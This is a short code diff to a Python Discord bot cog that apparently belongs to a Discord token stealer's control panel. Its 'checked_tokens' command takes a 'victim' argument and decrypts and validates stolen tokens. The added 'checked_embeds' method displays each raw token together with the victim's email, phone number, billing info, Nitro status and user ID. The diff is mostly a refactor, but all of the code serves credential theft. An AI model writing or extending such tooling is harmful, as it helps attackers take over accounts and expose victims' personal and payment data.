@@ -12,6 +12,19 @@ class CheckedTokens(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
 
+    def checked_embeds(self, token, email, phone, username, nitro, billing, avatar, userID):
+        embed=discord.Embed(title="Token Info:")
+        embed.set_author(name="NullCode1337", url="https://github.com/NullCode1337")
+        embed.set_thumbnail(url=avatar)
+        embed.add_field(name="Token", value=f"```{token}```", inline=False)
+        embed.add_field(name="Username", value=username, inline=True)
+        embed.add_field(name="Nitro", value=nitro, inline=True)
+        embed.add_field(name="Billing Info", value=billing, inline=True)
+        embed.add_field(name="ID", value=userID, inline=True)
+        embed.add_field(name="Phone Number", value=phone, inline=True)
+        embed.add_field(name="Email", value=email, inline=False)
+        return embed
+
     @commands.slash_command( )
     async def checked_tokens(self, ctx, victim):
         """Decrypts and checks all Discord Tokens
@@ -60,7 +73,7 @@ class CheckedTokens(commands.Cog):
                 return await ctx.followup.send(embed = self.bot.genEmbed("No valid Discord Tokens", datetime.now()))
             embeds = []
             for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
-                embeds.append(self.bot.checked_embeds(tk, em, ph, un, ni, bi, av, idqa))
+                embeds.append(self.checked_embeds(tk, em, ph, un, ni, bi, av, idqa))
                     
             if len(embeds) <= 1: await ctx.channel.send(embed=embeds[0])
             else: await ctx.channel.send(embed=embeds[0], view=Menu(embeds))
